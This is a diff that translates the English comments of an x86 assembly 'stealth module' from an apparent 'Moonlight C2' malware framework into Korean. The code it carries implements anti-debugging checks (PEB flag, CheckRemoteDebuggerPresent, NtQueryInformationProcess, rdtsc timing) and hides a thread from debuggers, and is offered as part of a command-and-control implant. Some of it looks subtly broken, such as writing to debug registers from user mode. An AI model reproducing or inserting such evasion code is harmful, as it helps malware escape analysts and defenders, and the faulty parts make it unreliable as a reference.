@@ -1,6 +1,6 @@
-; Moonlight C2 Framework - Stealth Module (x86 Assembly)
-; Advanced anti-debugging, anti-VM, and process hiding techniques
-; Assemble with NASM: nasm -f win32 stealth.asm -o stealth.obj
+; Moonlight C2 Framework - 스텔스 모듈 (x86 어셈블리)
+; 고급 안티 디버깅, 안티 VM, 프로세스 숨김 기법
+; NASM으로 어셈블: nasm -f win32 stealth.asm -o stealth.obj
 
 BITS 32
 
@@ -17,8 +17,8 @@ global _get_kernel32_base
 global _get_ntdll_base
 
 ; ==============================================================================
-; Anti-Debugging: Check if debugger is present
-; Returns: EAX = 1 if debugger detected, 0 otherwise
+; 안티 디버깅: 디버거가 있는지 확인
+; 반환: EAX = 디버거 탐지시 1, 아니면 0
 ; ==============================================================================
 _check_debugger:
     push ebp
@@ -29,20 +29,20 @@ _check_debugger:
     
     xor eax, eax
     
-    ; Method 1: PEB->BeingDebugged
-    mov eax, fs:[0x30]          ; Get PEB
+    ; 방법 1: PEB->BeingDebugged
+    mov eax, fs:[0x30]          ; PEB 가져오기
     movzx eax, byte [eax + 2]   ; PEB->BeingDebugged
     test eax, eax
     jnz .debugger_found
     
-    ; Method 2: CheckRemoteDebuggerPresent
+    ; 방법 2: CheckRemoteDebuggerPresent
     push esp                    ; lpDebuggerPresent
-    push 0xFFFFFFFF            ; hProcess (current)
+    push 0xFFFFFFFF            ; hProcess (현재 프로세스)
     call _CheckRemoteDebuggerPresent
     test eax, eax
     jnz .debugger_found
     
-    ; Method 3: NtQueryInformationProcess
+    ; 방법 3: NtQueryInformationProcess
     push 0                      ; ProcessDebugPort = 7
     push 4                      ; ProcessInformationLength
     push esp                    ; ProcessInformation
@@ -52,7 +52,7 @@ _check_debugger:
     test eax, eax
     jnz .debugger_found
     
-    ; Method 4: Hardware breakpoints check (DR0-DR7)
+    ; 방법 4: 하드웨어 중단점 체크 (DR0-DR7)
     xor eax, eax
     mov dr0, eax
     mov dr1, eax
@@ -61,12 +61,12 @@ _check_debugger:
     mov dr6, eax
     mov dr7, eax
     
-    ; Method 5: Timing check
+    ; 방법 5: 타이밍 체크
     rdtsc
     mov esi, eax
     rdtsc
     sub eax, esi
-    cmp eax, 0x1000            ; If difference > 4096 cycles, debugger present
+    cmp eax, 0x1000            ; 차이 > 4096 사이클이면 디버거 존재
     jg .debugger_found
     
     xor eax, eax
@@ -83,17 +83,17 @@ _check_debugger:
     ret
 
 ; ==============================================================================
-; Hide process from debugger
+; 디버거로부터 프로세스 숨김
 ; ==============================================================================
 _hide_from_debugger:
     push ebp
     mov ebp, esp
     
-    ; Call NtSetInformationThread with ThreadHideFromDebugger (0x11)
+    ; ThreadHideFromDebugger (0x11)로 NtSetInformationThread 호출
     push 0                      ; ThreadInformationLength
     push 0                      ; ThreadInformation
     push 0x11                   ; ThreadHideFromDebugger
-    push 0xFFFFFFFE            ; Current thread
+    push 0xFFFFFFFE            ; 현재 스레드
     call _NtSetInformationThread
     
     pop ebp
